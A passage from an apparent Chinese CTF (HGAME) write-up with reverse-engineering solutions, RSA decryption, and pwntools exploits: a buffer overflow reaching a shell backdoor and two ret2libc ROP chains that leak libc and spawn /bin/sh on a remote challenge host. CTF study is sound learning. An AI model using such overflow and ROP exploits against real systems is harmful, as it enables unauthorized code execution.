<p>加上我的注释应该很明了，倒推flag1,flag2然后倒推flag就好，exp如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span>

byte key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
byte arr1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"e4sy_Re_"</span><span class="token punctuation">;</span>
byte arr2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Easylif3"</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> byte <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">//得到第一个for循环后的flag1,flag2</span>
    byte flag1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token comment">//for循环前的flag1和flag2</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span> <span class="token comment">//再交换一次不就换回来了咯</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>
        flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span><span class="token punctuation">)</span> <span class="token operator">^</span> flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span> <span class="token operator">|</span> flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span><span class="token punctuation">;</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>

        <span class="token comment">//记得这个步骤</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//得到flag</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hgame&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        uint ch <span class="token operator">=</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        uint ch <span class="token operator">=</span> flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行程序得flag：<code>hgame&#123;0f233e63637982d266cbf41ecb1b0102&#125;</code></p>
<hr>
<h3 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h3><p>常规操作，我也写了注释，改了变量名和函数名</p>
<p><img src="/images/20ebc87d/re-3-1.png" alt="1"></p>
<p>下面那个strncmp的字符串一开始我数了下长度，是4的倍数，那时候开始我就猜是base64编码了，但是直接解密不太对。在encrypt函数里（这个名字当然是我自己改的）发现</p>
<p><img src="/images/20ebc87d/re-3-2.png" alt="2"></p>
<p><img src="/images/20ebc87d/re-3-3.png" alt="3"></p>
<p>查过base64的原理，知道有一个编码表的，那么这里应该是把标准的表换成这里的表来编码的，那解密的时候先把字符换回来再解密，python3的exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> string

<span class="token comment"># 待解密脚本</span>
str1 <span class="token operator">=</span> <span class="token string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>

<span class="token comment"># 题目中的表</span>
string1 <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>

<span class="token comment"># 原base64的表</span>
string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>

<span class="token comment"># 先把编码后的字符串str1的字符一一对应回原base64表的字符再解码</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到flag：<code>hgame&#123;b45e6a_i5_50_eazy_6VVSQ&#125;</code></p>
<hr>
<h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><p><strong>注意：本题有大量的猜测</strong></p>
<p>运行过一遍后，发现输入错误会显示<code>error</code>，那么拖入ida，<kbd>Alt</kbd>+<kbd>F4</kbd>搜索”error”字符串可以找到main函数。</p>
<p><img src="/images/20ebc87d/re-4-1.png" alt="1"></p>
<p>首先看到的是std::cin，大胆猜测这个操作相当于<code>std::cin &gt;&gt; v16</code>，先进去<code>sub_140002AE0</code>函数分析了一波，没怎么看懂，而且有很多无意义的代码。然后自己写了段c++代码，大概如下</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;string&gt;

int main()
&#123;
    string s;
    std::cin &gt;&gt; s;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译后拖入ida反汇编，发现有和红框中相似的代码，于是大胆猜测，<code>sub_140002AE0</code>函数是string类的构造函数，顺便也猜测到了一个vector类，还有一些类的方法（幸好我有点c++基础），分析完后大概是这样的：</p>
<p><img src="/images/20ebc87d/re-4-2.png" alt="2"></p>
<p><img src="/images/20ebc87d/re-4-3.png" alt="3"></p>
<p>（可以发现我的注释里充满了<strong>“可能”</strong>，<strong>“应该”</strong>）</p>
<p>看到那三层循环，和我之前写过的矩阵乘法很像，再加上hint说让我翻开线代课本，贯穿线代课本的除了矩阵还是矩阵，那么可以肯定这就是个矩阵乘法。</p>
<p>和我添加的注释一样，<code>rect_input * rect1 = rect2</code>这个rect_input 是输入，格式是<code>hgame&#123;r11_r12_r13_r20_r21_..._r33&#125;</code>，r11表示这是矩阵的第(1, 1)个元素</p>
<p>那简单了，解矩阵方程就好，找了个在线网站求rect1的逆，根据我的分析<code>rect1[0][1]</code>这个元素未知，盲猜0（其实也不是盲猜，因为我试了好多，发现rect1的逆都有小数，只有0的时候结果是整数）</p>
<p>最后解出矩阵input写成flag就行：<code>hgame&#123;-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943&#125;</code></p>
<hr>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>看下图</p>
<p><img src="/images/20ebc87d/pwn-1-1.png" alt="1"></p>
<p><img src="/images/20ebc87d/pwn-1-2.png" alt="2"></p>
<p>直接提供了一个后门，只要那么memcmp返回值为0即可getshell。</p>
<p>需要注意的是，memcmp这个函数是逐字节比较，相等才返回0，这里是比较7个字节（第三个参数），但是这个”0O0o”只看到4个字节+1个\0（结束符），还有2个字节不知道，那么双击这个字符串，可看到，剩下两个字节是<code>O0</code></p>
<p><img src="/images/20ebc87d/pwn-1-3.png" alt="3"></p>
<p>只要溢出，把v5地址处开始覆盖成<code>0O0o</code> + \0 + <code>O0</code>这7个字节即可，exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#io = process('./Hard_AAAAA')</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20000</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x7b</span> <span class="token operator">+</span> <span class="token string">'0O0o\x00O0'</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0!\n'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>getshell之后，读取flag文件</p>
<p><img src="/images/20ebc87d/pwn-1-4.png" alt="4"></p>
<hr>
<h3 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h3><p>红框框起的部分为关键部分</p>
<p><img src="/images/20ebc87d/pwn-2-1.png" alt="1"></p>
<p><img src="/images/20ebc87d/pwn-2-2.png" alt="2">其实就是根据读入的字符串转换成数字填到数组里，但是数组大小只有11，循环读入数字的次数却是19，每次可以写8个字节（__int64是8个字节），足够溢出修改返回地址了。</p>
<p>需要注意的是溢出到循环变量i的时候，不要修改变量i的值，也就是说第12次读入数字的时候，要保持变量i的值是11，还有就是i是4字节整数，它刚刚好在数组v4之后的8个字节的高4个字节处，也就是说，我们第12次读入的数字转成8字节整数时，其高4个字节看成一个int型整数，必须是11，那么最简单就写<code>47244640256</code>这个数就好了（47244640256 &gt;&gt; 32 == 11），exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">packAddr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>


elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Number_Killer'</span><span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
pop_rdi_ret_addr <span class="token operator">=</span> <span class="token number">0x400803</span>
main_addr <span class="token operator">=</span> <span class="token number">0x4006f6</span>

<span class="token comment"># 这个数写成8个字节，高处4字节当作一个整数解析刚刚好是11，即47244640256>>32 == 11</span>
<span class="token comment"># 数组大小为11，循环变量占了8个字节整数中的高4个字节，压入的rbp占了8个字节（一个数转成8个字节），所以这里为13</span>
payload <span class="token operator">=</span> <span class="token string">'47244640256\n'</span> <span class="token operator">*</span> <span class="token number">13</span>  

payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>pop_rdi_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'0\n'</span> <span class="token operator">*</span> <span class="token number">3</span>

<span class="token comment">#io = elf.process()</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.103.214.163"</span><span class="token punctuation">,</span> <span class="token number">20001</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

puts_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
puts_addr <span class="token operator">=</span> puts_addr <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">'47244640256\n'</span> <span class="token operator">*</span> <span class="token number">13</span> 
payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>pop_rdi_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'0\n'</span> <span class="token operator">*</span> <span class="token number">3</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag：略（哈哈哈，自己运行脚本）</p>
<hr>
<h3 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h3><p>关键位置：</p>
<p><img src="/images/20ebc87d/pwn-3-1.png" alt="1"></p>
<p>读入一个地址，将这个地址指向的那个字节赋值为1（一开始还以为是把name变量修改成flag，后来发现不可能）</p>
<p>其实问题很简单，先看下图：</p>
<p><img src="/images/20ebc87d/pwn-3-2.png" alt="2"></p>
<p>可以发现name和flag相邻，那么我们只需读入的name刚刚好结束符\0的下一个字节开始就是flag的第一个字节，那么通过这个<code>*v4=1</code>把结束符\0修改成1，也就是v4的输入为<code>0x6010E0</code>这个数的字符串（这个地址是固定的，并没有随机），那么printf的时候就会连着把flag给输出了，exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

name <span class="token operator">=</span> <span class="token string">'*'</span> <span class="token operator">*</span> <span class="token number">31</span>
addr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x6010DF</span><span class="token punctuation">)</span>

<span class="token comment">#io = process('./One_Shot')</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20002</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（怪不得题目叫这个）</p>
<hr>
<h3 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h3><p><img src="/images/20ebc87d/pwn-4-1.png" alt="1"></p>
<p>其实很明了，没有canary保护，题目提示可以通过文件读写操作把flag读出来，试了下不知道为什么一直错，然后就放弃了，所以我直接构造ROP，exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ROP_LEVEL0'</span><span class="token punctuation">)</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
start <span class="token operator">=</span> <span class="token number">0x40065b</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400753</span>


<span class="token comment">#io = elf.process()</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20003</span><span class="token punctuation">)</span>

<span class="token comment"># 泄露puts的地址从而得到libc库的版本，strat为函数的开头，跳转回这里相当于再来一次机会溢出</span>
payload <span class="token operator">=</span>  <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span>  <span class="token comment"># 0x48个用于填充，8个字节是那个fd数组，8个字节是rbp</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 最后一个字符是\n</span>

puts_addr <span class="token operator">=</span> puts_addr <span class="token operator">+</span>  <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 计算各个重要的地址</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>


<span class="token comment"># 得到地址后，pwn！</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>查一下密码学RSA的资料，知道p,q,e可以算出用来解密的d（目前只是简单了解了下），题目已经给出来了，那么exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">import</span> gmpy2

p <span class="token operator">=</span> <span class="token number">681782737450022065655472455411</span>
q <span class="token operator">=</span> <span class="token number">675274897132088253519831953441</span>
e <span class="token operator">=</span> <span class="token number">13</span>
c <span class="token operator">=</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span>

<span class="token comment"># 算出d</span>
phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 解密c</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span>

<span class="token comment"># m是一个数，需要转换成我们想要的字符串</span>
